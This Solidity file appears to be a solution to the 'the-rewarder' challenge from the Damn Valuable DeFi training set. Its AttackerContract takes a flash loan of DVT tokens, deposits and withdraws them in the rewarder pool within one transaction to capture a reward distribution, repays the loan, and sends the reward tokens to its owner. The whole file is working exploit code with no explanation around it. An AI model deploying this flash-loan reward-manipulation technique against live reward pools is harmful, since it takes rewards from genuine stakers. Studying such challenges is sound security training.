// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {FlashLoanerPool} from "../../../src/Contracts/the-rewarder/FlashLoanerPool.sol";
import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {TheRewarderPool} from "../../../src/Contracts/the-rewarder/TheRewarderPool.sol";
import {RewardToken} from "../../../src/Contracts/the-rewarder/RewardToken.sol";

contract AttackerContract {
    FlashLoanerPool private loanPool;
    TheRewarderPool private rewarderPool;
    address payable private owner;
    DamnValuableToken private token;
    RewardToken private rewardToken;

    constructor(
        address payable _owner,
        FlashLoanerPool _loanPool,
        TheRewarderPool _rewarderPool,
        DamnValuableToken _token,
        RewardToken _rewardToken
    ) {
        owner = _owner;
        loanPool = _loanPool;
        rewarderPool = _rewarderPool;
        token = _token;
        rewardToken = _rewardToken;
    }

    function attack(uint256 amount) external {
        token.approve(address(rewarderPool), amount);
        loanPool.flashLoan(amount);
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) external payable {
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        token.transfer(address(loanPool), amount);
    }
}
